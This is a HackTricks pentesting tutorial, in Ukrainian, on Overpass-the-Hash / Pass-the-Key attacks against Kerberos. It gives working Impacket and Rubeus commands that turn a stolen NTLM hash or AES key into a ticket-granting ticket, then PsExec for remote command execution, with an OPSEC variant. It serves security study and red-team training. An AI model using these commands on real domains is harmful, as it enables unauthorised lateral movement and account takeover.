# Over Pass the Hash/Pass the Key

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


## Overpass The Hash/Pass The Key (PTK)

Атака **Overpass The Hash/Pass The Key (PTK)** призначена для середовищ, де традиційний протокол NTLM обмежений, а аутентифікація Kerberos має перевагу. Ця атака використовує NTLM хеш або AES ключі користувача для отримання квитків Kerberos, що дозволяє несанкціонований доступ до ресурсів у мережі.

Для виконання цієї атаки перший крок полягає в отриманні NTLM хешу або пароля цільового облікового запису користувача. Після отримання цієї інформації можна отримати Квиток на надання квитків (TGT) для облікового запису, що дозволяє зловмиснику отримати доступ до сервісів або машин, до яких має доступ користувач.

Процес можна ініціювати за допомогою наступних команд:
```bash
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
Для сценаріїв, що вимагають AES256, можна використовувати опцію `-aesKey [AES key]`. Крім того, отриманий квиток може бути використаний з різними інструментами, включаючи smbexec.py або wmiexec.py, розширюючи обсяг атаки.

Проблеми, такі як _PyAsn1Error_ або _KDC cannot find the name_, зазвичай вирішуються шляхом оновлення бібліотеки Impacket або використанням імені хоста замість IP-адреси, що забезпечує сумісність з Kerberos KDC.

Альтернативна послідовність команд, що використовує Rubeus.exe, демонструє ще один аспект цієї техніки:
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Цей метод відображає підхід **Pass the Key**, зосереджуючись на захопленні та використанні квитка безпосередньо для цілей аутентифікації. Важливо зазначити, що ініціація запиту TGT викликає подію `4768: A Kerberos authentication ticket (TGT) was requested`, що означає використання RC4-HMAC за замовчуванням, хоча сучасні системи Windows віддають перевагу AES256.

Щоб відповідати вимогам операційної безпеки та використовувати AES256, можна застосувати наступну команду:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
## References

* [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Вивчайте та практикуйте AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Вивчайте та практикуйте GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримати HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на github.

</details>
{% endhint %}
